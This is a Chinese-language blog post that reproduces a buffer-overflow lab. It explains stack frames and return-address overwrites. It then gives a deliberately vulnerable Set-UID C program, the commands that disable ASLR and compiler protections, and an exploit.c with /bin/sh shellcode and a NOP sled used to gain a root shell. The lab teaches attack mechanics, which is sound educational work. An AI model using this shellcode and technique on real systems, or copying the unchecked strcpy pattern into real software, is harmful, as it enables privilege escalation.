---
layout: post
title: stackOverflow
categories:
- paper
tags:
- technology
- 
---

##缓冲区溢出漏洞实验

##一、实验简介

缓冲区溢出是指程序试图向缓冲区写入超出预分配固定长度数据的情况。这一漏洞可以被恶意用户利用来改变程序的流控制，甚至执行代码的任意片段。这一漏洞的出现是由于数据缓冲器和返回地址的暂时关闭，溢出会引起返回地址被重写。

顾名思义，缓冲区溢出的含义是为缓冲区提供了多于其存储容量的数据，就像往杯子里倒入了过量的水一样。通常情况下，缓冲区溢出的数据只会破坏程序数据，造成意外终止。
但是如果有人精心构造溢出数据的内容，那么就有可能获得系统的控制权.

缓冲区在系统中的表现形式是多样的，高级语言定义的变量、数组、结构体等在运行时可以说都是保存在缓冲区内的，
因此所谓缓冲区可以更抽象地理解为一段可读写的内存区域，缓冲区攻击的最终目的就是希望系统能执行这块可读写内存中已经被蓄意设定好的恶意代码
按照冯·诺依曼存储程序原理，程序代码是作为二进制数据存储在内存的，同样程序的数据也在内存中，因此直接从内存的二进制形式上是无法区分哪些是
数据哪些是代码的，这也为缓冲区溢出攻击提供了可能。

<img src="https://github.com/dengguang2012/paper-Reading-Report/blob/master/illustraction/22.jpg" style="width: 50%; height: 50%"/>

图1是进程地址空间分布的简单表示。代码存储了用户程序的所有可执行代码，在程序正常执行的情况下，程序计数器（PC指针）只会在代码段和操作系统地址空间（内核态）内寻址。数据段内存储了用户程序的全局变量，文字池等。栈空间存储了用户程序的函数栈帧（包括参数、局部数据等），实现函数调用机制，它的数据增长方向是低地址方向。堆空间存储了程序运行时动态申请的内存数据等，数据增长方向是高地址方向。除了代码段和受操作系统保护的数据区域，其他的内存区域都可能作为缓冲区，因此缓冲区溢出的位置可能在数据段，也可能在堆、栈段。如果程序的代码有软件漏洞，恶意程序会“教唆”程序计数器从上述缓冲区内取指，执行恶意程序提供的数据代码！本文分析并实现栈溢出攻击方式。

栈的主要功能是实现函数的调用。因此在介绍栈溢出原理之前，需要弄清函数调用时栈空间发生了怎样的变化。每次函数调用时，系统会把函数的返回地址（函数调用指令后紧跟指令的地址），一些关键的寄存器值保存在栈内，函数的实际参数和局部变量（包括数据、结构体、对象等）也会保存在栈内。这些数据统称为函数调用的栈帧，而且是每次函数调用都会有个独立的栈帧，这也为递归函数的实现提供了可能。

<img src="https://github.com/dengguang2012/paper-Reading-Report/blob/master/illustraction/23.jpg" style="width: 50%; height: 50%"/>

如图所示，我们定义了一个简单的函数function，它接受一个整形参数，做一次乘法操作并返回。当调用function(0)时，arg参数记录了值0入栈，并将call function指令下一条指令的地址0x00bd16f0保存到栈内，然后跳转到function函数内部执行。每个函数定义都会有函数头和函数尾代码，如图绿框表示。因为函数内需要用ebp保存函数栈帧基址，因此先保存ebp原来的值到栈内，然后将栈指针esp内容保存到ebp。函数返回前需要做相反的操作——将esp指针恢复，并弹出ebp。这样，函数内正常情况下无论怎样使用栈，都不会使栈失去平衡。

sub esp,44h指令为局部变量开辟了栈空间，比如ret变量的位置。理论上，function只需要再开辟4字节空间保存ret即可，但是编译器开辟了更多的空间（这个问题很诡异，你觉得呢？）。函数调用结束返回后，函数栈帧恢复到保存参数0时的状态，为了保持栈帧平衡，需要恢复esp的内容，使用add esp,4将压入的参数弹出。

之所以会有缓冲区溢出的可能，主要是因为栈空间内保存了函数的返回地址。该地址保存了函数调用结束后后续执行的指令的位置，对于计算机安全来说，该信息是很敏感的。如果有人恶意修改了这个返回地址，并使该返回地址指向了一个新的代码位置，程序便能从其它位置继续执行。

上边给出的代码是无法进行溢出操作的，因为用户没有“插足”的机会。但是实际上很多程序都会接受用户的外界输入，尤其是当函数内的一个数组缓冲区接受用户输入的时候，一旦程序代码未对输入的长度进行合法性检查的话，缓冲区溢出便有可能触发！比如下边的一个简单的函数。
 

	void fun(unsigned char *data)
	{
		unsigned char buffer[BUF_LEN];
		strcpy((char*)buffer,(char*)data);//溢出点
	}

这个函数没有做什么有“意义”的事情（这里主要是为了简化问题），但是它是一个典型的栈溢出代码。在使用不安全的strcpy库函数时，系统会盲目地将data的全部数据拷贝到buffer指向的内存区域。buffer的长度是有限的，一旦data的数据长度超过BUF_LEN，便会产生缓冲区溢出。

<img src="https://github.com/dengguang2012/paper-Reading-Report/blob/master/illustraction/24.jpg" style="width: 50%; height: 50%"/>

由于栈是低地址方向增长的，因此局部数组buffer的指针在缓冲区的下方。当把data的数据拷贝到buffer内时，超过缓冲区区域的高地址部分数据会“淹没”原本的其他栈帧数据，根据淹没数据的内容不同，可能会有产生以下情况：

1、淹没了其他的局部变量。如果被淹没的局部变量是条件变量，那么可能会改变函数原本的执行流程。这种方式可以用于破解简单的软件验证。

2、淹没了ebp的值。修改了函数执行结束后要恢复的栈指针，将会导致栈帧失去平衡。

3、淹没了返回地址。这是栈溢出原理的核心所在，通过淹没的方式修改函数的返回地址，使程序代码执行“意外”的流程！

4、淹没参数变量。修改函数的参数变量也可能改变当前函数的执行结果和流程。

5、淹没上级函数的栈帧，情况与上述4点类似，只不过影响的是上级函数的执行。当然这里的前提是保证函数能正常返回，即函数地址不能被随意修改（这可能很麻烦！）。

如果在data本身的数据内就保存了一系列的指令的二进制代码，一旦栈溢出修改了函数的返回地址，并将该地址指向这段二进制代码的其实位置，那么就完成了基本的溢出攻击行为。

<img src="https://github.com/dengguang2012/paper-Reading-Report/blob/master/illustraction/25.jpg" style="width: 50%; height: 50%"/>

通过计算返回地址内存区域相对于buffer的偏移，并在对应位置构造新的地址指向buffer内部二进制代码的其实位置，便能执行用户的自定义代码！这段既是代码又是数据的二进制数据被称为shellcode，因为攻击者希望通过这段代码打开系统的shell，以执行任意的操作系统命令——比如下载病毒，安装木马，开放端口，格式化磁盘等恶意操作。

上述过程虽然理论上能完成栈溢出攻击行为，但是实际上很难实现。操作系统每次加载可执行文件到进程空间的位置都是无法预测的，因此栈的位置实际是不固定的，通过硬编码覆盖新返回地址的方式并不可靠。为了能准确定位shellcode的地址，需要借助一些额外的操作，其中最经典的是借助跳板的栈溢出方式。

根据前边所述，函数执行后，栈指针esp会恢复到压入参数时的状态，在图4中即data参数的地址。如果我们在函数的返回地址填入一个地址，该地址指向的内存保存了一条特殊的指令jmp esp——跳板。那么函数返回后，会执行该指令并跳转到esp所在的位置——即data的位置。我们可以将缓冲区再多溢出一部分，淹没data这样的函数参数，并在这里放上我们想要执行的代码！这样，不管程序被加载到哪个位置，最终都会回来执行栈内的代码。

<img src="https://github.com/dengguang2012/paper-Reading-Report/blob/master/illustraction/26.jpg" style="width: 50%; height: 50%"/>

在esp后继续追加shellcode代码会将上级函数的栈帧淹没，这样做并没有什么好处，甚至可能会带来运行时问题。既然被溢出的函数栈帧内提供了缓冲区，我们还是把核心的shellcode放在缓冲区内，而在esp之后放上跳转指令转移到原本的缓冲区位置。由于这样做使代码的位置在esp指针之前，如果shellcode中使用了push指令便会让esp指令与shellcode代码越来越近，甚至淹没自身的代码。这显然不是我们想要的结果，因此我们可以强制抬高esp指针，使它在shellcode之前（低地址位置），这样就能在shellcode内正常使用push指令了。




##二、实验准备

系统用户名shiyanlou
实验楼提供的是64位Ubuntu linux，而本次实验为了方便观察汇编语句，我们需要在32位环境下作操作，因此实验之前需要做一些准备。
1、输入命令安装一些用于编译32位C程序的东西：

	sudo apt-get update

	sudo apt-get install lib32z1 libc6-dev-i386

	sudo apt-get install lib32readline-gplv2-dev

2、输入命令“linux32”进入32位linux环境。此时你会发现，命令行用起来没那么爽了，比如不能tab补全了，所以输入“/bin/bash”使用bash：

##三、实验步骤

##3.1 初始设置

Ubuntu和其他一些Linux系统中，使用地址空间随机化来随机堆（heap）和栈（stack）的初始地址，这使得猜测准确的内存地址变得十分困难，而猜测内存地址是缓冲区溢出攻击的关键。因此本次实验中，我们使用以下命令关闭这一功能：
sudo sysctl -w kernel.randomize_va_space=0
此外，为了进一步防范缓冲区溢出攻击及其它利用shell程序的攻击，许多shell程序在被调用时自动放弃它们的特权。因此，即使你能欺骗一个Set-UID程序调用一个shell，也不能在这个shell中保持root权限，这个防护措施在/bin/bash中实现。
linux系统中，/bin/sh实际是指向/bin/bash或/bin/dash的一个符号链接。为了重现这一防护措施被实现之前的情形，我们使用另一个shell程序（zsh）代替/bin/bash。下面的指令描述了如何设置zsh程序：

	sudo su

	cd /bin

	rm sh

	ln -s zsh sh

	exit

##3.2 shellcode

一般情况下，缓冲区溢出会造成程序崩溃，在程序中，溢出的数据覆盖了返回地址。而如果覆盖返回地址的数据是另一个地址，那么程序就会跳转到该地址，如果该地址存放的是一段精心设计的代码用于实现其他功能，这段代码就是shellcode。
观察以下代码：

	#include <stdio.h>
	int main( ) {
	char *name[2];
	name[0] = ‘‘/bin/sh’’;
	name[1] = NULL;
	execve(name[0], name, NULL);
	}

本次实验的shellcode，就是刚才代码的汇编版本：
\x31\xc0\x50\x68"//sh"\x68"/bin"\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
3.3 漏洞程序
把以下代码保存为“stack.c”文件，保存到 /tmp 目录下。代码如下：

	/* stack.c */
	/* This program has a buffer overflow vulnerability. */
	/* Our task is to exploit this vulnerability */
	#include <stdlib.h>
	#include <stdio.h>
	#include <string.h>

	int bof(char *str)
	{
	char buffer[12];

	/* The following statement has a buffer overflow problem */
	strcpy(buffer, str);

	return 1;
	}

	int main(int argc, char **argv)
	{
	char str[517];
	FILE *badfile;
	badfile = fopen("badfile", "r");
	fread(str, sizeof(char), 517, badfile);
	bof(str);
	printf("Returned Properly\n");
	return 1;
	}

通过代码可以知道，程序会读取一个名为“badfile”的文件，并将文件内容装入“buffer”。
编译该程序，并设置SET-UID。命令如下：

	sudo su

	gcc -m32 -g -z execstack -fno-stack-protector -o stack stack.c

	chmod u+s stack

	exit

GCC编译器有一种栈保护机制来阻止缓冲区溢出，所以我们在编译代码时需要用 –fno-stack-protector 关闭这种机制。
而 -z execstack 用于允许执行栈。
##3.4 攻击程序
我们的目的是攻击刚才的漏洞程序，并通过攻击获得root权限。
把以下代码保存为“exploit.c”文件，保存到 /tmp 目录下。代码如下：

	/* exploit.c */
	/* A program that creates a file containing code for launching shell*/
	#include <stdlib.h>
	#include <stdio.h>
	#include <string.h>

	char shellcode[]=

	"\x31\xc0"    //xorl %eax,%eax
	"\x50"        //pushl %eax
	"\x68""//sh"  //pushl $0x68732f2f
	"\x68""/bin"  //pushl $0x6e69622f
	"\x89\xe3"    //movl %esp,%ebx
	"\x50"        //pushl %eax
	"\x53"        //pushl %ebx
	"\x89\xe1"    //movl %esp,%ecx
	"\x99"        //cdq
	"\xb0\x0b"    //movb $0x0b,%al
	"\xcd\x80"    //int $0x80
	;

	void main(int argc, char **argv)
	{
	char buffer[517];
	FILE *badfile;

	/* Initialize buffer with 0x90 (NOP instruction) */
	memset(&buffer, 0x90, 517);

	/* You need to fill the buffer with appropriate contents here */
	strcpy(buffer,"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x??\x??\x??\x??");
	strcpy(buffer+100,shellcode);

	/* Save the contents to the file "badfile" */
	badfile = fopen("./badfile", "w");
	fwrite(buffer, 517, 1, badfile);
	fclose(badfile);
	}

	注意上面的代码，“\x??\x??\x??\x??”处需要添上shellcode保存在内存中的地址，因为发生溢出后这个位置刚好可以覆盖返回地址。
而 strcpy(buffer+100,shellcode); 这一句又告诉我们，shellcode保存在 buffer+100 的位置。
现在我们要得到shellcode在内存中的地址，输入命令：
gdb stack

disass main
结果如图：

<img src="https://github.com/dengguang2012/paper-Reading-Report/blob/master/illustraction/19.jpg" style="width: 50%; height: 50%"/>​


根据语句 strcpy(buffer+100,shellcode); 我们计算shellcode的地址为 0xffffd1b0(十六进制)+100(十进制)=0xffffd214(十六进制)
现在修改exploit.c文件！将 \x??\x??\x??\x?? 修改为 \x14\xd2\xff\xff
然后，编译exploit.c程序：
gcc -m32 -o exploit exploit.c

##3.5 攻击结果

先运行攻击程序exploit，再运行漏洞程序stack，观察结果：

<img src="https://github.com/dengguang2012/paper-Reading-Report/blob/master/illustraction/20.jpg" style="width: 50%; height: 50%"/>​

可见，通过攻击，获得了root权限！
如果不能攻击成功，提示”段错误“，那么请重新使用gdb反汇编，计算内存地址。

##四、练习

1、按照实验步骤进行操作，攻击漏洞程序并获得root权限。

2、通过命令”sudo sysctl -w kernel.randomize_va_space=2“打开系统的地址空间随机化机制，重复用exploit程序攻击stack程序，观察能否攻击成功，能否获得root权限。

3、将/bin/sh重新指向/bin/bash（或/bin/dash），观察能否攻击成功，能否获得root权限。


<img src="https://github.com/dengguang2012/paper-Reading-Report/blob/master/illustraction/21.jpg" style="width: 50%; height: 50%"/>​


